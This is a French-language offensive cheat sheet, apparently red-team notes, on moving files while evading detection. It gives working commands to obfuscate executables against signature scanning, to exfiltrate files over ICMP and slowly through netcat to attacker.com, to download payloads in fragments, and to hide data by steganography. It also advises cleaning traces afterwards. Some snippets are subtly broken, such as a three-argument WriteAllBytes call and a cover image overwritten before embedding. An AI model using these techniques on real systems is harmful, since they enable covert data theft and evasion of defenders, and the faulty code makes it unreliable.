# Protection des Transferts de Fichiers

## Chiffrement de Fichiers

Le chiffrement protège la confidentialité des données pendant le transfert et empêche la détection de contenu malveillant.

### Windows (PowerShell)

```powershell
# Utilisation de Invoke-AESEncryption.ps1
# Importer le module
Import-Module .\Invoke-AESEncryption.ps1

# Chiffrer un fichier
Invoke-AESEncryption -Mode Encrypt -Key "P@ssw0rd" -Path C:\file.exe

# Déchiffrer un fichier
Invoke-AESEncryption -Mode Decrypt -Key "P@ssw0rd" -Path C:\file.exe.aes
```

### Linux (OpenSSL)

```bash
# Chiffrement avec AES-256
openssl enc -aes256 -iter 100000 -pbkdf2 -in file.bin -out file.bin.enc -k "P@ssw0rd"

# Déchiffrement
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.bin.enc -out file.bin -k "P@ssw0rd"
```

## Compression avec Protection par Mot de Passe

### Windows

```powershell
# PowerShell avec 7-Zip
& 'C:\Program Files\7-Zip\7z.exe' a -pP@ssw0rd -mx=9 archive.7z file.exe

# Extraction
& 'C:\Program Files\7-Zip\7z.exe' x -pP@ssw0rd archive.7z
```

### Linux

```bash
# Création d'une archive chiffrée
7z a -pP@ssw0rd -mx=9 archive.7z file.bin

# Alternative avec zip
zip -e -P P@ssw0rd archive.zip file.bin

# Extraction
7z x -pP@ssw0rd archive.7z
```

## Obfuscation des Fichiers

### Modifier les Signatures de Fichiers

```bash
# Ajouter des données en fin de fichier
echo "PADDING_DATA" >> file.exe

# Modifier les en-têtes pour éviter la détection
dd if=/dev/urandom bs=1 count=10 of=random_bytes
cat random_bytes file.exe > modified_file.exe
```

### Segmentation de Fichiers

```bash
# Segmenter un fichier (Linux)
split -b 1M file.bin file.bin.part

# Recombiner les parties
cat file.bin.part* > file.bin

# Segmenter un fichier (Windows PowerShell)
$file = [System.IO.File]::ReadAllBytes("file.exe")
$chunkSize = 1MB
for($i=0; $i -lt $file.Length; $i+=$chunkSize) {
    $chunk = $file[$i..($i+$chunkSize-1)]
    [System.IO.File]::WriteAllBytes("file.part$($i/($chunkSize))", $chunk)
}

# Recombiner (Windows)
$parts = Get-ChildItem -Filter "file.part*" | Sort-Object Name
$output = New-Object -TypeName byte[] -ArgumentList (($parts | Measure-Object -Property Length -Sum).Sum)
$position = 0
foreach($part in $parts) {
    $bytes = [System.IO.File]::ReadAllBytes($part.FullName)
    [System.Buffer]::BlockCopy($bytes, 0, $output, $position, $bytes.Length)
    $position += $bytes.Length
}
[System.IO.File]::WriteAllBytes("file.exe", $output)
```

## Transferts Non Détectables

### Utilisation de Protocoles Alternatifs

```bash
# ICMP (nécessite des outils spécifiques)
# Sur la machine attaquante
sudo hping3 --listen signature --safe

# Sur la machine cible
cat file.bin | xxd -p -c 4 | while read line; do sudo hping3 -c 1 -E <(echo "signature$line") attacker.com; done
```

### Transferts Temporisés

Ralentir les transferts pour éviter la détection par les systèmes basés sur le volume.

```bash
# Linux - envoi lent
cat file.bin | while read -n1 char; do echo -n "$char"; sleep 0.1; done | nc attacker.com 8000

# PowerShell - téléchargement fragmenté
$client = New-Object System.Net.WebClient
$url = "http://attacker.com/file.exe"
$output = "C:\file.exe"
$fileSize = (Invoke-WebRequest -Uri $url -Method Head).Headers.'Content-Length'
$bufferSize = 1024
for($i=0; $i -lt $fileSize; $i+=$bufferSize) {
    $client.Headers.Add("Range", "bytes=$i-$($i+$bufferSize-1)")
    $bytes = $client.DownloadData($url)
    [System.IO.File]::WriteAllBytes($output, $bytes, $i)
    Start-Sleep -Milliseconds 100
}
```

## Techniques de Steganographie

Cacher des données dans d'autres fichiers (images, audio, etc.).

```bash
# Linux - cacher des données dans une image
cat file.bin > image.jpg
steghide embed -cf image.jpg -ef file.bin -p "P@ssw0rd"

# Extraction
steghide extract -sf image.jpg -p "P@ssw0rd"
```

## Points Importants

- Le chiffrement est crucial pour les données sensibles
- La compression réduit le temps de transfert et peut aider à dissimuler le contenu
- L'obfuscation peut contourner certaines détections basées sur les signatures
- Les transferts temporisés peuvent éviter les alertes basées sur le volume de données
- Combiner plusieurs techniques pour une sécurité maximale
- Toujours nettoyer les traces après le transfert